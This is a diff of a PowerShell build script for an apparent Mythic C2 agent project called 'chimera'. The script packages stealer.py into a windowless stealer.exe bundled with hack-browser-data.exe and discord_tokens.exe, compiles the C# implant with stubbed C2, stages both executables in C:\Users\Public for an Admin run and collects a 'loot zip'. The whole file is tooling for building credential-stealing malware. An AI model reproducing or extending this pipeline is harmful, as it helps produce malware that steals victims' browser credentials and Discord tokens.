@@ -1,94 +1,59 @@
 # build_local_test.ps1
 # Builds stealer.exe then chimera_local_test.exe
 # Run from: C:\projects\chimera-mythic-agent\local_test\
-# Requires: Python + pyinstaller, .NET Framework 4.x (csc.exe built into Windows)
-#
-# Usage:
-#   cd C:\projects\chimera-mythic-agent\local_test
-#   powershell -ep bypass .\build_local_test.ps1
+# Usage: powershell -ep bypass .\build_local_test.ps1
 
 $ErrorActionPreference = "Stop"
-$here = $PSScriptRoot  # always the local_test\ folder
+$here  = Split-Path -Parent $MyInvocation.MyCommand.Path
+$agent = Join-Path $here "..\agent_code"
+$cmds  = Join-Path $agent "Commands"
+$csc   = "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
+$stage = "C:\Users\Public"
+$loot  = "C:\projects\chimera-local-test"
 
-# ─── Paths ────────────────────────────────────────────────────────────────────
-$csc      = "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
-$agent    = Join-Path $here "..\agent_code"
-$cmds     = Join-Path $agent "Commands"
-$lootDir  = "C:\projects\chimera-local-test"
-$stageDir = "C:\Users\Public"
-
-# ─── Prereqs ──────────────────────────────────────────────────────────────────
-if (-not (Test-Path $csc)) {
-    Write-Error "csc.exe not found at $csc — .NET Framework 4.x required"
-    exit 1
-}
-
-# ─── STEP 1: Build stealer.exe ────────────────────────────────────────────────
 Write-Host ""
-Write-Host "═══════════════════════════════════════"
+Write-Host "======================================="
 Write-Host "  STEP 1: Build stealer.exe"
-Write-Host "═══════════════════════════════════════"
+Write-Host "======================================="
 
-$stealerPy = Join-Path $here "stealer.py"
-if (-not (Test-Path $stealerPy)) {
-    Write-Error "stealer.py not found at $stealerPy"
-    exit 1
-}
-
-# Check pyinstaller
-$piCheck = & python -m pyinstaller --version 2>&1
-if ($LASTEXITCODE -ne 0) {
-    Write-Host "[*] pyinstaller not found — installing..."
-    & pip install pyinstaller
-}
-
-# hack-browser-data and discord_tokens must be in local_test\ alongside stealer.py
-$hbd     = Join-Path $here "hack-browser-data.exe"
-$discord = Join-Path $here "discord_tokens.exe"
-
-if (-not (Test-Path $hbd)) {
-    Write-Warning "hack-browser-data.exe not found in $here — stealer will fail at runtime"
-}
-if (-not (Test-Path $discord)) {
-    Write-Warning "discord_tokens.exe not found in $here — Discord tokens step will fail"
-}
-
-# Build stealer.exe
-$piArgs = @(
-    "--onefile", "--noconsole",
-    "--distpath", $here,
-    "--workpath", (Join-Path $here "pyinstaller_build"),
-    "--specpath", (Join-Path $here "pyinstaller_build")
-)
-if (Test-Path $hbd)     { $piArgs += @("--add-binary", "${hbd};.") }
-if (Test-Path $discord) { $piArgs += @("--add-binary", "${discord};.") }
-$piArgs += $stealerPy
-
-Write-Host "[*] Running pyinstaller..."
-& python -m pyinstaller @piArgs
-
+$stealerPy  = Join-Path $here "stealer.py"
 $stealerExe = Join-Path $here "stealer.exe"
-if (Test-Path $stealerExe) {
-    Write-Host "[+] stealer.exe built: $stealerExe ($([int]((Get-Item $stealerExe).Length/1KB)) KB)"
-} else {
-    Write-Error "stealer.exe not found after build — check pyinstaller output above"
+$hbd        = Join-Path $here "hack-browser-data.exe"
+$discord    = Join-Path $here "discord_tokens.exe"
+
+if (-not (Test-Path $stealerPy)) { Write-Error "stealer.py not found in $here"; exit 1 }
+if (-not (Test-Path $hbd))       { Write-Warning "hack-browser-data.exe not found in $here" }
+if (-not (Test-Path $discord))   { Write-Warning "discord_tokens.exe not found in $here" }
+
+$piArgs = "--onefile --noconsole --distpath `"$here`" --workpath `"$here\pyinstaller_build`" --specpath `"$here\pyinstaller_build`""
+if (Test-Path $hbd)     { $piArgs += " --add-binary `"$hbd;.`"" }
+if (Test-Path $discord) { $piArgs += " --add-binary `"$discord;.`"" }
+$piArgs += " `"$stealerPy`""
+
+Write-Host "[*] Running: python -m pyinstaller $piArgs"
+Invoke-Expression "python -m pyinstaller $piArgs"
+
+if (-not (Test-Path $stealerExe)) {
+    Write-Error "stealer.exe not found after build"
     exit 1
 }
+$sz = [int]((Get-Item $stealerExe).Length / 1024)
+Write-Host "[+] stealer.exe built ($sz KB)"
 
-# Copy stealer.exe to staging dir so chimera_local_test can find it
-New-Item -ItemType Directory -Force -Path $stageDir | Out-Null
-Copy-Item $stealerExe (Join-Path $stageDir "stealer.exe") -Force
-Write-Host "[+] Copied stealer.exe -> $stageDir\stealer.exe"
+New-Item -ItemType Directory -Force -Path $stage | Out-Null
+Copy-Item $stealerExe "$stage\stealer.exe" -Force
+Write-Host "[+] Copied -> $stage\stealer.exe"
 
-# ─── STEP 2: Generate LocalStubs.cs ──────────────────────────────────────────
 Write-Host ""
-Write-Host "═══════════════════════════════════════"
+Write-Host "======================================="
 Write-Host "  STEP 2: Build chimera_local_test.exe"
-Write-Host "═══════════════════════════════════════"
+Write-Host "======================================="
+
+if (-not (Test-Path $csc)) { Write-Error "csc.exe not found at $csc"; exit 1 }
 
 $stubFile = Join-Path $here "LocalStubs.cs"
-@'
-// Stubs — C2Http and Tasking are no-ops in local test (no Mythic server needed)
+Set-Content $stubFile -Encoding UTF8 -Value @"
+// Stubs for local test build - no Mythic server needed
 using System;
 namespace Chimera {
     public static class C2Http {
@@ -103,10 +68,9 @@ namespace Chimera {
         public static string ExtractJsonValue(string json, string key) { return null; }
     }
 }
-'@ | Set-Content $stubFile -Encoding UTF8
+"@
 Write-Host "[+] LocalStubs.cs written"
 
-# ─── STEP 3: Compile chimera_local_test.exe ───────────────────────────────────
 $out = Join-Path $here "chimera_local_test.exe"
 
 $sources = @(
@@ -130,43 +94,27 @@ $sources = @(
     (Join-Path $cmds "Help.cs")
 )
 
-$cscArgs = @(
-    "/target:exe",
-    "/platform:x86",
-    "/out:$out",
-    "/r:System.Net.Http.dll",
-    "/r:System.Drawing.dll",
-    "/r:System.Management.dll",
-    "/r:System.ServiceProcess.dll",
-    "/r:System.Windows.Forms.dll"
-) + $sources
+$cscArgs = "/target:exe /platform:x86 /out:`"$out`" /r:System.Net.Http.dll /r:System.Drawing.dll /r:System.Management.dll /r:System.ServiceProcess.dll /r:System.Windows.Forms.dll"
+foreach ($s in $sources) { $cscArgs += " `"$s`"" }
 
 Write-Host "[*] Compiling chimera_local_test.exe..."
-& $csc @cscArgs
+Invoke-Expression "& `"$csc`" $cscArgs"
 
-if ($LASTEXITCODE -ne 0) {
-    Write-Error "Compile failed (exit $LASTEXITCODE) — check errors above"
-    exit 1
-}
+if ($LASTEXITCODE -ne 0) { Write-Error "Compile failed"; exit 1 }
 
-Write-Host "[+] chimera_local_test.exe built: $out ($([int]((Get-Item $out).Length/1KB)) KB)"
+$sz2 = [int]((Get-Item $out).Length / 1024)
+Write-Host "[+] chimera_local_test.exe built ($sz2 KB)"
 
-# ─── STEP 4: Copy chimera_local_test.exe to staging dir ──────────────────────
-Copy-Item $out (Join-Path $stageDir "chimera_local_test.exe") -Force
-Write-Host "[+] Copied chimera_local_test.exe -> $stageDir\chimera_local_test.exe"
+Copy-Item $out "$stage\chimera_local_test.exe" -Force
+Write-Host "[+] Copied -> $stage\chimera_local_test.exe"
 
-# ─── Done ─────────────────────────────────────────────────────────────────────
 Write-Host ""
-Write-Host "═══════════════════════════════════════"
+Write-Host "======================================="
 Write-Host "  BUILD COMPLETE"
-Write-Host "═══════════════════════════════════════"
+Write-Host "======================================="
 Write-Host ""
-Write-Host "Files in $stageDir :"
-Write-Host "  stealer.exe"
-Write-Host "  chimera_local_test.exe"
-Write-Host ""
-Write-Host "To run (open PowerShell as Admin):"
-Write-Host "  cd $stageDir"
+Write-Host "Run (as Admin):"
+Write-Host "  cd $stage"
 Write-Host "  .\chimera_local_test.exe"
 Write-Host ""
-Write-Host "Log + loot zip will appear in: $lootDir"
+Write-Host "Log + loot zip -> $loot"
